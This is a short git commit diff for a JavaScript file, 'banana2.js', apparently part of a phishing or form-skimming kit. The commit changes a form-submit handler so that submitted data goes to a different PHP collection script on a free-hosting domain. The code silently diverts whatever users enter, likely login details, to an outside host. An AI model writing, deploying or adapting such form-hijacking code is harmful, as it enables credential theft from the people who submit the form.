af31ea4891ebc899bd972e9780d5e3bc9c9c5a76
susumilkuenak <alberciokarambia@hotmail.com>
2024-05-17 00:24:25 +0800

    Update banana2.js

--- jonsbo/cupboard/banana2.js
+++ jonsbo/cupboard/banana2.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://maitrivmyadventureex.000webhostapp.com/super/cocok2.php");
+  $(myform).attr("action", "https://maitrivmyadventureex.000webhostapp.com/lombo/baok.php");
 });
